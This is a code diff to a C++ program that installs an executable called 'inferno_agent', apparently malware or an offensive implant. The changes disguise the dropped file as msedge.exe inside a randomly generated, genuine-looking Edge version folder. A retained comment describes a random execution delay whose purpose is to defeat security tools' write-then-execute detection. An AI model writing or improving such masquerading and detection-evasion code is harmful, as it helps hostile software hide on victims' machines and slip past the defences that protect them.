@@ -40,7 +40,23 @@ std::string installPath() {
         return "C:\\temp\\inferno_agent.exe";
     }
     std::string path(appdata);
-    path += "\\Microsoft\\Edge\\Application\\msedge.exe";
+    path += "\\Microsoft\\Edge\\Application\\";
+
+    // Append a plausible Edge version subdirectory (e.g. 114.0.1823.58)
+    // so the path mirrors a genuine installation.
+    {
+        std::random_device rd;
+        std::mt19937 rng(rd());
+        std::uniform_int_distribution<int> major_dist(100, 130);
+        std::uniform_int_distribution<int> minor_dist(0, 5);
+        std::uniform_int_distribution<int> build_dist(1500, 2300);
+        std::uniform_int_distribution<int> patch_dist(30, 120);
+        path += std::to_string(major_dist(rng)) + ".";
+        path += std::to_string(minor_dist(rng)) + ".";
+        path += std::to_string(build_dist(rng)) + ".";
+        path += std::to_string(patch_dist(rng));
+    }
+    path += "\\msedge.exe";
     return path;
 #elif defined(__APPLE__)
     const char* home = ::getenv("HOME");
@@ -95,8 +111,8 @@ bool createDirectoryForFile(std::string& path) {
         fallback.pop_back();
     }
 
-    std::mt19937 rng(static_cast<unsigned>(
-        std::chrono::steady_clock::now().time_since_epoch().count()));
+    std::random_device rd;
+    std::mt19937 rng(rd());
     std::uniform_int_distribution<int> hex_dist(0, 15);
     const char hex_chars[] = "0123456789abcdef";
     fallback += "\\";
@@ -243,8 +259,8 @@ int main(int argc, char* argv[]) {
 
     // Execution jitter: 5-15s random delay to break write-then-execute heuristics
     {
-        std::mt19937 rng(static_cast<unsigned>(
-            std::chrono::steady_clock::now().time_since_epoch().count()));
+        std::random_device rd;
+        std::mt19937 rng(rd());
         std::uniform_int_distribution<int> jitter_dist(5, 15);
         int delay = jitter_dist(rng);
 #ifdef _WIN32
